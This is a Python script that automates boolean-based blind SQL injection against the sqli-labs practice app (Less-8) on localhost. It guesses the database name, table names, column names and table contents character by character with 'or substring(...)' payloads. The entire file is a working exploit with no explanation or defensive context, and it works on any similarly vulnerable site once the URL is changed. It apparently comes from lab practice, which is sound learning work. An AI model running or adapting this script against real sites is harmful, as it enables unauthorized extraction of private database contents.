url="http://localhost/sqli-labs-php7/Less-8/"
import string
import requests 
def dblength():
    for i in range (1,100):
        payload=url+"?id=-1'or length(database())="+str(i)+"-- -"
        r=requests.get(payload)
        response=r.content.decode('utf-8')
        if "You are in..........." in response:
            length=i
            break
    return length
    print(i)
    print(payload)
def dbname(length):
 s=""
 for j in range(1,length+1):
    for k in string.printable:
        payload=url+"?id=-1'or substring(database(),1,"+str(j)+")="+"'"+s+k+"'"+"-- -"
        print(payload)
        r=requests.get(payload)
        response=r.content.decode('utf-8')
        if "You are in..........." in response:
            s=s+k
            break
 return s
def tablelen():
     for i in range(1,100):
         payload=url+"?id=-1' or length((select group_concat(table_name)from information_schema.tables where table_schema="+"'"+database_name+"'"+"))="+str(i)+"-- -"
         print (payload)
         r=requests.get(payload)
         response=r.content.decode('utf-8')
         if "You are in..........." in response:
             break
     table_length=i
     return table_length
def table_details():
    s=""
    for i in range(1,table_length+1):
        for j in string.printable:
            payload=url+"?id=-1' or substring((select group_concat(table_name)from information_schema.tables where table_schema="+"'"+database_name+"'),1,"+str(i)+")='"+s+j+"'"+"-- -"
            print(payload)
            r=requests.get(payload)
            response=r.content.decode('utf-8')
            if "You are in..........." in response:
                s=s+j
                break
        print(s)
    return s
def column_length():
    columns_length=[]
    l=len(table_names)
    for i in range(l):
        for j in range(100):
            payload=url+"?id=-1' or length((select group_concat(column_name)from information_schema.columns where table_name="+"'"+table_names[i]+"'"+"))="+str(j)+"-- -"
            print(payload)
            r=requests.get(payload)
            response=r.content.decode('utf-8')
            if "You are in..........." in response:
                columns_length.append(j)
                break
    return columns_length

def column_names():
    columns_name=[]
    s=""
    for i in range(len(table_names)):
        s=""
        for j in range(1,columns_length[i]+1):
            for k in string.printable:
                payload=url+"?id=-1' or substring((select group_concat(column_name)from information_schema.columns where table_name="+"'"+table_names[i]+"'),1,"+str(j)+")='"+s+k+"'"+"-- -"
                print(payload)
                r=requests.get(payload)
                response=r.content.decode('utf-8')
                if "You are in..........." in response:
                    s=s+k
                    break
        columns_name.append(s)
    return columns_name

def info_data():
    info_length=[]
    data_dumb=[]
    n=int(input("input the number of table to dump"))
    singe_column=[]
    single_column=columns_name[n].split(",")
    for i in range(len(single_column)):
        for j in range(1,1000):
            payload=url+"?id=-1' or length((select group_concat("+single_column[i]+") from "+table_names[n]+"))="+str(j)+"-- -"
            print(payload)
            r=requests.get(payload)
            response=r.content.decode('utf-8')
            if "You are in..........." in response:
                info_length.append(j)
                break
    for k in range(len(info_length)):
        s=""
        for l in range(1,info_length[k]+1):
            for m in string.printable:
                payload=url+"?id=-1' or substring((select group_concat("+single_column[k]+")from "+table_names[n]+"),1,"+str(l)+")='"+s+m+"'-- -"
                print(payload)
                r=requests.get(payload)
                response=r.content.decode('utf-8')
                if "You are in..........." in response:
                    s=s+m
                    break
        data_dumb.append(s)
    return (data_dumb,info_length)





    





                



                




length=dblength()
database_name=dbname(length)
table_length=tablelen()
table_names=[]
table_names=table_details().split(",")
columns_length=column_length()
columns_name=column_names()
print("table name found",table_names)
data_dumb,info_length=info_data()
print("database length found",length)
print("database name found",database_name)
print("table length found",table_length)
print("tables name found",table_names)
print("column lengths found",columns_length)
print("column name found",columns_name)
print("data length found for given table",info_length)
print("data found from given table",data_dumb)
